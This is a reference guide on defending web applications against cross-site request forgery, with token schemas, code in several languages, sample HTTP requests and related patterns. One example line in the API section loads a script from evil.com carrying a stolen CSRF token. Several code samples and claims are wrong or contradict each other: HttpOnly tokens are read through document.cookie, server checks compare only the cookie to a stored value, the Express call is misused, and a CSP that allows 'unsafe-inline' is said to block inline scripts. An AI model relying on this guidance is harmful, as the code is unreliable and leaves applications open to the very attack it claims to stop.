---
# **[Security] CSRF Protection (Cross-Site Request Forgery) Pattern – Reference Guide**
*Mitigating unauthorized automated actions via forged HTTP requests.*

---

## **Overview**
Cross-Site Request Forgery (CSRF) exploits trusted user sessions to perform malicious actions on a web application. Unlike XSS, CSRF does not require code execution—it hijacks the browser’s authenticated state (e.g., cookies) to trick victims into submitting requests unknowingly.

**Problem:**
An attacker embeds a hidden `<img>`, `<form>`, or JavaScript payload in a third-party site (e.g., social media) to execute requests on the victim’s behalf (e.g., `POST /transfer-funds?amount=1000`).

**CSRF Tokens Solution:**
- Assign a **unique, session-scoped token** to each user request.
- Include the token in `POST`, `PUT`, or `DELETE` inputs (e.g., `<input type="hidden" name="csrf_token" value="...">`).
- Validate the token server-side *for every state-changing request*.

**Benefit:**
- Attackers cannot forge tokens (cookies/headers are inaccessible via JavaScript).
- Minimal performance overhead; tokens can be reused per session.

---

## **Schema Reference**
| **Field**               | **Type**       | **Description**                                                                 | **Example**                          |
|-------------------------|----------------|---------------------------------------------------------------------------------|--------------------------------------|
| `csrf_token`            | String (UUID)  | Unique, single-use token per request. Generated server-side on first request. | `e246d3d3-8f1f-4f3c-9b2e-5a1d7c9f1b3e` |
| `csrf_token_expires_at` | Timestamp      | Optional expiry for short-lived tokens (e.g., 5 minutes).                        | `2024-01-01T12:00:00Z`               |
| `state`                 | String         | Optional CSRF-proof state (e.g., to prevent replay attacks).                     | `user_id=123&action=update_profile`  |
| **Storage Locations**   |                |                                                                                 |                                      |
| Cookie (`csrf_token`)   | HTTP-only      | Persistent per user session (default).                                          | `Set-Cookie: csrf_token=e3b9f...; Secure; SameSite=Strict` |
| Header (`X-CSRF-Token`) | Custom         | Alternative for APIs (requires client-side handling).                           | `X-CSRF-Token: a1b2c3...`             |
| HTML Input              | Hidden Field   | For forms: `<input type="hidden" name="csrf_token" value="${token}">`.           | `<input name="csrf_token" value="x7y9z...">` |

---

## **Implementation Details**

### **1. Token Generation**
- **Server-Side Logic** (Pseudocode):
  ```python
  import secrets, uuid

  def generate_csrf_token(user_id):
      token = secrets.token_urlsafe(32)  # Cryptographically secure
      set_cookie("csrf_token", token, expires_in=300, secure=True, samesite="strict")
      return {"csrf_token": token}
  ```

- **Storage**:
  - **Cookies**: `Secure`, `HttpOnly`, `SameSite=Strict` (mitigates CSRF + XSS leaks).
  - **Database**: Optional, for state validation (e.g., `WHERE user_id = $user_id AND token = $input_token`).

### **2. Client-Side Integration**
#### **Option A: HTML Forms (Web Apps)**
```html
<!-- Generate token on page load (e.g., via JavaScript or server-rendered meta tag) -->
<meta name="csrf-token" content="{{ csrf_token }}">

<form method="POST" action="/transfer">
  <input type="hidden" name="amount" value="100">
  <input type="hidden" name="csrf_token" value="{{ csrf_token }}">  <!-- or fetch from meta -->
  <button type="submit">Transfer</button>
</form>
```
**JavaScript (Dynamic Fetch):**
```javascript
fetch("/api/update", {
  method: "POST",
  body: JSON.stringify({ amount: 50, csrf_token: metaCSRFToken }),
  headers: { "Content-Type": "application/json" }
});
```

#### **Option B: APIs (AJAX/Fetch)**
- **Header Injection** (Recommended for APIs):
  ```javascript
  fetch("/api/delete", {
    method: "DELETE",
    headers: {
      "X-CSRF-Token": document.cookie.split("; ")[0].split("=")[1],
      "Authorization": `Bearer ${userToken}`
    }
  });
  ```
- **Query Parameter** (Less secure; avoid for sensitive actions):
  ```html
  <script src="https://evil.com?target=/withdraw&csrf_token=STOLEN_TOKEN"></script>
  ```

### **3. Server-Side Validation**
**Language-Specific Examples:**

#### **Ruby (Rails)**
```ruby
# app/controllers/application_controller.rb
before_action :verify_csrf_token

def verify_csrf_token
  token = request.cookies["csrf_token"]
  unless token == session[:csrf_token]  # Or DB lookup
    render plain: "CSRF token invalid", status: 403
  end
end
```

#### **Node.js (Express)**
```javascript
const csrf = require("csurf");
const csrfProtection = csrf({ cookie: true });

app.use(csrfProtection);

app.post("/transfer", csrfProtection, (req, res) => {
  if (req.csrfToken !== req.body.csrf_token) {
    return res.status(403).send("Invalid CSRF token");
  }
  // Process request...
});
```

#### **PHP**
```php
session_start();
if (!isset($_SESSION['csrf_token']) || $_POST['csrf_token'] !== $_SESSION['csrf_token']) {
  die("CSRF token mismatch");
}
```

### **4. Token Expiry & Reissuance**
- **Short-Lived Tokens**: Regenerate on every request (simplest).
- **State-Based Tokens**: Include a `state` field to prevent replay attacks:
  ```javascript
  // Client
  const state = btoa(JSON.stringify({ user_id: 123, action: "delete" }));
  fetch("/api/delete", { method: "DELETE", body: { csrf_token, state } });

  // Server
  const expectedState = atob(state);
  if (expectedState !== JSON.stringify({ user_id: 123, action: "delete" })) {
    reject("Invalid state");
  }
  ```

---

## **Query Examples**
### **1. Generating a CSRF Token**
**Request (POST):**
```http
GET /generate-csrf-token HTTP/1.1
Host: example.com
Cookie: session_id=abc123
```
**Response:**
```http
HTTP/1.1 200 OK
Set-Cookie: csrf_token=e3b9f...; Secure; SameSite=Strict
Content-Type: application/json

{
  "csrf_token": "e3b9f...",
  "csrf_token_expires_at": "2024-01-01T12:00:00Z"
}
```

### **2. Validating a CSRF Token**
**Request (POST):**
```http
POST /transfer-funds HTTP/1.1
Host: example.com
Cookie: csrf_token=e3b9f...
Content-Type: application/x-www-form-urlencoded

amount=100&csrf_token=e3b9f...
```
**Server Check:**
```python
if request.cookies.get("csrf_token") != stored_token:
    raise Forbidden("CSRF attack detected")
```

### **3. Failed CSRF Validation**
**Request:**
```http
POST /transfer-funds HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

amount=100&csrf_token=WRONG_TOKEN
```
**Response:**
```http
HTTP/1.1 403 Forbidden
Content-Type: text/plain

CSRF token invalid
```

---

## **Edge Cases & Mitigations**
| **Scenario**               | **Vulnerability**                          | **Solution**                                  |
|----------------------------|--------------------------------------------|-----------------------------------------------|
| Missing CSRF token         | Bypassed validation.                       | Reject requests without tokens.               |
| Token expiry               | Stored tokens become invalid.              | Regenerate tokens on form load.               |
| Token leakage via XSS      | Attacker steals token via malicious script. | Use `HttpOnly`, `Secure` cookies.              |
| Third-party requests       | Embedded `<img>` tags (no user control).   | Disable for non-GET requests; use `SameSite`.  |
| CSRF in iframes            | Cross-origin iframe sends requests.        | Set `SameSite=Lax` or `Strict`.              |

---

## **Related Patterns**
1. **[SameSite Cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies)**
   - **Synergy**: `SameSite=Strict` prevents CSRF by blocking unauthenticated cross-site requests.
   - **Tradeoff**: May break third-party integrations (e.g., OAuth).

2. **[Double Submit Cookie](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html#double-submit-cookie)**
   - **Synergy**: Alternative to tokens; sends cookie + request body.
   - **Use Case**: Legacy systems where JavaScript is unreliable.

3. **[CORS (Cross-Origin Resource Sharing)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)**
   - **Synergy**: Restrict API endpoints to same-origin requests (`Access-Control-Allow-Origin`).
   - **Limitation**: Not a standalone CSRF defense (tokens still needed for browsers).

4. **[Content Security Policy (CSP)](https://content-security-policy.com/)**
   - **Synergy**: Block inline scripts to prevent CSRF payload injection (e.g., `<script src="...">`).
   - **Example Header**:
     ```
     Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' https://trusted.cdn.com
     ```

5. **[Origin Validation](https://portswigger.net/web-security/csrf/preventing-csrf)**
   - **Synergy**: Compare `Origin`/`Referer` headers for state-changing requests.
   - **Limitation**: Bypassed if attacker controls the Referer (e.g., via proxy).

---

## **Best Practices**
1. **Token Scope**:
   - Generate per-user session (not globally).
   - Invalidate tokens after use (for stateful applications).

2. **Storage**:
   - Prefer cookies over headers (harder for attackers to manipulate).
   - Avoid storing tokens in `localStorage`/`sessionStorage` (vulnerable to XSS).

3. **APIs**:
   - Use `X-CSRF-Token` header for AJAX requests.
   - Combine with CORS for stricter controls.

4. **Logging**:
   - Audit failed CSRF checks (potential attack attempts).

5. **Testing**:
   - Verify tokens are regenerated on page reloads.
   - Test with tools like [CSRFer](https://github.com/topics/csrf-tools).

---
**References:**
- OWASP CSRF Prevention Cheat Sheet: [https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- RFC 6265 (HTTP Cookies): [https://datatracker.ietf.org/doc/html/rfc6265](https://datatracker.ietf.org/doc/html/rfc6265)